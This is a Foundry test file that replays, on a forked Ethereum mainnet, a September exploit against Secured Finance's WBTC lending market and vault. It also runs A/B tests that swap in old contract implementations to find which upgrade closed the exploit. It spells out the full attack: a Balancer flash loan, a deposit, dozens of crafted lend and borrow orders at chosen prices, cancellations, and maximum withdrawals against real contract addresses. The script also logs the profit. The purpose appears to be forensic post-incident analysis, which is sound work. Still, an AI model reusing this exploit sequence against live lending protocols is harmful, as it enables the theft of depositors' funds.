// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {Vm} from "forge-std/Vm.sol";
import {SecuredFiExploit} from "./SecuredFinanceLive.t.sol";

// Step-by-step diagnostic of the Sept attack sequence against the CURRENT
// (unpaused on fork) state, to pinpoint exactly which step changed.

interface ILMC2 {
    function executeOrder(bytes32 ccy, uint256 maturity, uint8 side, uint256 amount, uint256 unitPrice)
        external
        returns (bool);
    function cancelOrder(bytes32 ccy, uint256 maturity, uint48 orderId) external returns (bool);
    function cleanUpFunds(bytes32 ccy, address user) external returns (uint256);
}

interface ITV2 {
    function deposit(bytes32 ccy, uint256 amount) external payable;
    function withdraw(bytes32 ccy, uint256 amount) external;
    function getDepositAmount(address user, bytes32 ccy) external view returns (uint256);
    function getCollateralDetail(address user)
        external
        view
        returns (uint256 totalCollateral, uint256 totalUsedCollateral, uint256 totalDeposit);
    function getWithdrawableCollateral(bytes32 ccy, address user) external view returns (uint256);
    function isCovered(address user, bytes32 ccy) external view returns (bool isEnoughCollateral, bool isEnoughDeposit);
}

interface ILM2 {
    function paused() external view returns (bool);
    function getMarketUnitPrice(uint8 orderBookId) external view returns (uint256);
    function getBlockUnitPriceHistory(uint8 orderBookId) external view returns (uint256[] memory, uint48);
}

interface IBal2 {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

contract StepRunner {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    address internal constant CTRL = 0x35e9D8e0223A75E51a67aa731127C91Ea0779Fe2;
    address internal constant VAULT = 0xB74749b2213916b1dA3b869E41c7c57f1db69393;
    address internal constant WBTC_MKT = 0x2Dcb346FD48e5EA28Bb6812df0A8d4c2Cd006feB;
    address internal constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    bytes32 internal constant CCY = bytes32("WBTC");
    IERC20 internal constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    uint256 internal immutable maturity;
    address internal immutable owner;
    bool internal immutable probe;

    string[] internal lines;

    constructor(uint256 _maturity, bool _probe) {
        maturity = _maturity;
        owner = msg.sender;
        probe = _probe;
    }

    function nLines() external view returns (uint256) {
        return lines.length;
    }

    function line(uint256 i) external view returns (string memory) {
        return lines[i];
    }

    function start(uint256 flashAmount) external {
        require(msg.sender == owner, "owner");
        maker = address(new Maker2(VAULT, CTRL, CCY, maturity, address(WBTC)));
        flashAmountCached = flashAmount;
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(WBTC);
        amounts[0] = flashAmount;
        IBal2(BALANCER).flashLoan(address(this), tokens, amounts, "");
    }

    uint256 internal flashAmountCached;

    function receiveFlashLoan(address[] calldata, uint256[] calldata, uint256[] calldata, bytes calldata) external {
        _snap("after flashloan");
        _call("approve", address(WBTC), abi.encodeCall(IERC20.approve, (VAULT, type(uint256).max)));
        _call("deposit 0.91", VAULT, abi.encodeCall(ITV2.deposit, (CCY, 91_000_000)));
        _snap("after deposit");

        // Phase 1
        _order("P1-1 lend 99998@3", 0, 99998, 3);
        _order("P1-2 lend 1@9500", 0, 1, 9500);
        _order("P1-3 lend 1@1", 0, 1, 1);
        _order("P1-4 lend 1@9200", 0, 1, 9200);
        _order("P1-5 lend 1@9300", 0, 1, 9300);
        _order("P1-6 lend 1@2", 0, 1, 2);
        _cancel("P1-7 cancel 5", 5);
        _order("P1-8 borrow 2@9300", 1, 2, 9300);
        _order("P1-9 lend 1@9400", 0, 1, 9400);
        _order("P1-10 lend 1@9100", 0, 1, 9100);
        _order("P1-11 borrow 1@9400", 1, 1, 9400);
        _cancel("P1-12 cancel 8", 8);
        _clean("P1-13 clean");
        _snap("before P1 withdraw");
        _call("P1-14 withdraw max", VAULT, abi.encodeCall(ITV2.withdraw, (CCY, type(uint256).max)));
        _snap("after P1 withdraw");

        // Phase 2
        _call("P2-1 transfer 0.9 to maker", address(WBTC), abi.encodeCall(IERC20.transfer, (maker, 90_000_000)));
        _call("P2-2 maker deposit+lend@10000", maker, abi.encodeCall(MakerLike.depositAndLend, (90_000_000, 10000)));
        _snap("before P2-3 borrow");
        _order("P2-3 borrow 90M@10000", 1, 90_000_000, 10000);
        _snap("after P2-3 borrow");
        _snap("before P2 withdraw");
        _call("P2-4 withdraw 90M", VAULT, abi.encodeCall(ITV2.withdraw, (CCY, 90_000_000)));
        _snap("after P2 withdraw");

        // Phase 3
        _call("P3-1 deposit 100", VAULT, abi.encodeCall(ITV2.deposit, (CCY, 100)));
        _order("P3-2 borrow 5@9270", 1, 5, 9270);
        _order("P3-3 borrow 3@9250", 1, 3, 9250);
        _order("P3-4 borrow 4@10000", 1, 4, 10000);
        _order("P3-5 borrow 9@9900", 1, 9, 9900);
        _order("P3-6 borrow 6@9260", 1, 6, 9260);
        _order("P3-7 borrow 89999000@9700", 1, 89_999_000, 9700);
        _order("P3-8 borrow 1@9230", 1, 1, 9230);
        _order("P3-9 borrow 5@9800", 1, 5, 9800);
        _order("P3-10 borrow 4@9240", 1, 4, 9240);
        _cancel("P3-11 cancel 18", 18);
        _order("P3-12 borrow 2@9220", 1, 2, 9220);
        _order("P3-13 lend 15@9260", 0, 15, 9260);
        _cancel("P3-14 cancel 15", 15);
        _cancel("P3-15 cancel 12", 12);
        _order("P3-16 borrow 2@9260", 1, 2, 9260);
        _cancel("P3-17 cancel 19", 19);
        _cancel("P3-18 cancel 22", 22);
        _clean("P3-19 clean");
        _snap("before P3 withdraw");
        _call("P3-20 withdraw max", VAULT, abi.encodeCall(ITV2.withdraw, (CCY, type(uint256).max)));
        _snap("after P3 withdraw");

        // repay balancer (diagnostic: repayment always attempted at the end)
        _call("repay flash", address(WBTC), abi.encodeCall(IERC20.transfer, (BALANCER, flashAmountCached)));
    }

    address internal maker;

    function _call(string memory tag, address target, bytes memory data) internal {
        (bool ok, bytes memory ret) = target.call(data);
        if (ok) {
            _log(string.concat(tag, " OK"));
        } else {
            _log(string.concat(tag, " REVERT ", _reason(ret)));
        }
    }

    function _order(string memory tag, uint8 side, uint256 amount, uint256 price) internal {
        _call(
            tag,
            CTRL,
            abi.encodeWithSelector(ILMC2.executeOrder.selector, CCY, maturity, side, amount, price)
        );
    }

    function _cancel(string memory tag, uint48 id) internal {
        _call(tag, CTRL, abi.encodeWithSelector(ILMC2.cancelOrder.selector, CCY, maturity, id));
    }

    function _clean(string memory tag) internal {
        _call(tag, CTRL, abi.encodeWithSelector(ILMC2.cleanUpFunds.selector, CCY, address(this)));
    }

    function _snap(string memory tag) internal {
        string memory s = string.concat(
            "[",
            tag,
            "] dep=",
            vm.toString(ITV2(VAULT).getDepositAmount(address(this), CCY)),
            " price=",
            vm.toString(ILM2(WBTC_MKT).getMarketUnitPrice(16))
        );
        s = string.concat(s, " h0=", vm.toString(_hist0()));
        s = string.concat(s, " pnl=", vm.toString(WBTC.balanceOf(address(this))));
        if (probe) {
            s = string.concat(s, " coll=", vm.toString(_tc()));
            s = string.concat(s, " used=", vm.toString(_tuc()));
            s = string.concat(s, " cov=", _enough() ? "1" : "0");
            uint256[9] memory f = _funds();
            s = string.concat(
                s,
                " | borrow=",
                vm.toString(f[7]),
                " debt=",
                vm.toString(f[8]),
                " claim=",
                vm.toString(f[3]),
                " cAmt=",
                vm.toString(f[4]),
                " lent=",
                vm.toString(f[5]),
                " wBO=",
                vm.toString(f[6])
            );
        }
        _log(s);
    }

    function _hist0() internal view returns (uint256) {
        (uint256[] memory hist,) = ILM2(WBTC_MKT).getBlockUnitPriceHistory(16);
        return hist[0];
    }

    function _tc() internal view returns (uint256 v) {
        try ITV2(VAULT).getCollateralDetail(address(this)) returns (uint256 a, uint256, uint256) {
            v = a;
        } catch {
            v = type(uint256).max;
        }
    }

    function _tuc() internal view returns (uint256 v) {
        try ITV2(VAULT).getCollateralDetail(address(this)) returns (uint256, uint256 b, uint256) {
            v = b;
        } catch {
            v = type(uint256).max;
        }
    }

    function _funds() internal view returns (uint256[9] memory o) {
        (bool ok, bytes memory ret) = CTRL.staticcall(
            abi.encodeWithSignature("calculateFunds(bytes32,address,uint256)", CCY, address(this), uint256(12500))
        );
        if (ok && ret.length >= 288) {
            uint256[9] memory tmp;
            assembly {
                let p := add(ret, 32)
                for {
                    let i := 0
                } lt(i, 9) {
                    i := add(i, 1)
                } {
                    mstore(add(tmp, add(32, mul(i, 32))), mload(add(p, mul(i, 32))))
                }
            }
            o = tmp;
        }
    }

    function _enough() internal view returns (bool v) {
        try ITV2(VAULT).isCovered(address(this), CCY) returns (bool a, bool) {
            v = a;
        } catch {
            v = false;
        }
    }

    function _log(string memory s) internal {
        lines.push(s);
    }

    function _reason(bytes memory ret) internal pure returns (string memory) {
        if (ret.length >= 4) {
            bytes4 sel;
            assembly {
                sel := mload(add(ret, 32))
            }
            if (sel == 0x08c379a0 && ret.length >= 68) {
                // Error(string)
                bytes memory str = new bytes(ret.length - 68);
                for (uint256 i = 0; i < str.length; i++) {
                    str[i] = ret[i + 68];
                }
                return string.concat("Error(", string(str), ")");
            }
            return string.concat("selector ", vm.toString(sel));
        }
        return "empty revert";
    }
}

interface MakerLike {
    function depositAndLend(uint256 amount, uint256 unitPrice) external;
}

contract Maker2 {
    address internal immutable owner;
    address internal immutable vault;
    address internal immutable ctrl;
    bytes32 internal immutable ccy;
    uint256 internal immutable maturity;
    IERC20 internal immutable token;

    constructor(address _vault, address _ctrl, bytes32 _ccy, uint256 _m, address _token) {
        owner = msg.sender;
        vault = _vault;
        ctrl = _ctrl;
        ccy = _ccy;
        maturity = _m;
        token = IERC20(_token);
    }

    function depositAndLend(uint256 amount, uint256 unitPrice) external {
        require(msg.sender == owner, "only owner");
        token.approve(vault, type(uint256).max);
        ITV2(vault).deposit(ccy, amount);
        ILMC2(ctrl).executeOrder(ccy, maturity, 0, amount, unitPrice);
    }
}

contract SecuredFiDiagnostics is Test {
    address internal constant VAULT = 0xB74749b2213916b1dA3b869E41c7c57f1db69393;
    address internal constant WBTC_MKT = 0x2Dcb346FD48e5EA28Bb6812df0A8d4c2Cd006feB;
    bytes32 internal constant PAUSE_SLOT = 0x9c789132bdb3678132848a8dcd780bffd2b1abdce3984c522ac1d8aeb48f05f2;
    uint256 internal constant MATURITY = 1830211200;

    function test_diag_current_unpaused() public {
        bool historic = vm.envOr("DIAG_HISTORIC", uint256(0)) == 1;
        string memory rpc = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        if (historic) {
            string memory arc = vm.envOr("NODEREAL_ETH_RPC_URL", vm.envOr("BLOCKPI_RPC_URL", rpc));
            vm.createSelectFork(arc, 25_914_191);
            vm.roll(25_914_192);
            vm.warp(1_788_648_191);
            emit log_named_uint("diag HISTORIC fork block", block.number);
        } else {
            uint256 pin = vm.envOr("FORK_BLOCK", uint256(0));
            if (pin == 0) {
                vm.createSelectFork(rpc);
            } else {
                vm.createSelectFork(rpc, pin);
            }
            emit log_named_uint("diag fork block", block.number);
            vm.store(WBTC_MKT, PAUSE_SLOT, bytes32(uint256(0)));
            vm.store(VAULT, PAUSE_SLOT, bytes32(uint256(0)));
        }

        uint256 vaultBefore = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(VAULT);
        emit log_named_decimal_uint("vault WBTC before", vaultBefore, 8);

        StepRunner runner = new StepRunner(MATURITY, vm.envOr("DIAG_PROBE", uint256(1)) == 1);
        // fund the runner so flash-loan repayment can never fail the diagnostic
        deal(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, address(runner), 300_000_000);

        try runner.start(91_000_000) {
            emit log("runner.start completed");
        } catch Error(string memory reason) {
            emit log_named_string("runner.start reverted", reason);
        } catch (bytes memory data) {
            emit log_named_bytes("runner.start reverted data", data);
        }

        uint256 n = runner.nLines();
        for (uint256 i = 0; i < n; i++) {
            emit log_string(runner.line(i));
        }
        uint256 vaultAfter = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(VAULT);
        emit log_named_decimal_uint("vault WBTC after", vaultAfter, 8);
    }
}

// --- A/B test: which upgraded contract closed the free-leverage path? ---
// Swap the beacon implementation (fork-only vm.store) to the exploit-time
// implementation and re-run the Sept sequence.
contract SecuredFiAB is Test {
    address internal constant VAULT = 0xB74749b2213916b1dA3b869E41c7c57f1db69393;
    address internal constant WBTC_MKT = 0x2Dcb346FD48e5EA28Bb6812df0A8d4c2Cd006feB;
    address internal constant WBTC_BEACON = 0x62012fa259Ac86894078223A3789de6dd74C50c7;
    address internal constant FV_BEACON = 0x42F5034938D1f8eD4df29A0c4F1beE21347dac2c;
    bytes32 internal constant PAUSE_SLOT = 0x9c789132bdb3678132848a8dcd780bffd2b1abdce3984c522ac1d8aeb48f05f2;
    uint256 internal constant MATURITY = 1830211200;

    function _forkHead() internal {
        string memory rpc = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        uint256 pin = vm.envOr("FORK_BLOCK", uint256(0));
        if (pin == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, pin);
        }
    }

    function _run(string memory tag, address newFvImpl, address newMktImpl) internal {
        _forkHead();
        vm.store(WBTC_MKT, PAUSE_SLOT, bytes32(uint256(0)));
        vm.store(VAULT, PAUSE_SLOT, bytes32(uint256(0)));
        if (newFvImpl != address(0)) vm.store(FV_BEACON, bytes32(uint256(0)), bytes32(uint256(uint160(newFvImpl))));
        if (newMktImpl != address(0)) vm.store(WBTC_BEACON, bytes32(uint256(0)), bytes32(uint256(uint160(newMktImpl))));

        uint256 vaultBefore = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(VAULT);
        SecuredFiExploit ex = new SecuredFiExploit(MATURITY);
        bool reverted;
        bytes4 sel;
        try ex.attack() {
            // no revert
        } catch (bytes memory data) {
            reverted = true;
            if (data.length >= 4) {
                assembly {
                    sel := mload(add(data, 32))
                }
            }
        }
        uint256 profit = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(address(ex));
        uint256 vaultAfter = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(VAULT);
        emit log_named_string("AB config", tag);
        emit log_named_uint("AB reverted", reverted ? 1 : 0);
        emit log_named_bytes("AB error", abi.encodePacked(sel));
        emit log_named_decimal_uint("AB profit WBTC", profit, 8);
        emit log_named_decimal_uint("AB vault before", vaultBefore, 8);
        emit log_named_decimal_uint("AB vault after", vaultAfter, 8);
    }

    function test_ab_old_fv_impl() public {
        _run("current market impl + OLD FV vault impl (C860E52F)", 0xC860E52F999dd8539ef554118A35Ebdf6b344816, address(0));
    }

    function test_ab_old_market_impl() public {
        _run("OLD market impl (d06dd40b) + current FV vault impl", address(0), 0xD06dd40Ba7c2cff3a6Aa2f59C55d249AcA57E521);
    }

    function test_ab_both_old() public {
        _run("OLD market + OLD FV (full exploit-time code)", 0xC860E52F999dd8539ef554118A35Ebdf6b344816, 0xD06dd40Ba7c2cff3a6Aa2f59C55d249AcA57E521);
    }

    function test_ab_old_lmc_impl() public {
        _runOldLmc("OLD LMC impl (60ccbf7e) at current block", address(0), address(0));
    }

    function _runOldLmc(string memory tag, address newFvImpl, address newMktImpl) internal {
        _forkHead();
        vm.store(WBTC_MKT, PAUSE_SLOT, bytes32(uint256(0)));
        vm.store(VAULT, PAUSE_SLOT, bytes32(uint256(0)));
        vm.store(0x35e9D8e0223A75E51a67aa731127C91Ea0779Fe2, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, bytes32(uint256(uint160(0x60ccbf7e864df8C7223216baca4149a8190E5Fc7))));
        if (newFvImpl != address(0)) vm.store(FV_BEACON, bytes32(uint256(0)), bytes32(uint256(uint160(newFvImpl))));
        if (newMktImpl != address(0)) vm.store(WBTC_BEACON, bytes32(uint256(0)), bytes32(uint256(uint160(newMktImpl))));

        uint256 vaultBefore = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(VAULT);
        SecuredFiExploit ex = new SecuredFiExploit(MATURITY);
        bool reverted;
        bytes4 sel;
        try ex.attack() {
        } catch (bytes memory data) {
            reverted = true;
            if (data.length >= 4) {
                assembly {
                    sel := mload(add(data, 32))
                }
            }
        }
        uint256 profit = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(address(ex));
        uint256 vaultAfter = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(VAULT);
        emit log_named_string("AB config", tag);
        emit log_named_uint("AB reverted", reverted ? 1 : 0);
        emit log_named_bytes("AB error", abi.encodePacked(sel));
        emit log_named_decimal_uint("AB profit WBTC", profit, 8);
        emit log_named_decimal_uint("AB vault before", vaultBefore, 8);
        emit log_named_decimal_uint("AB vault after", vaultAfter, 8);
    }
}
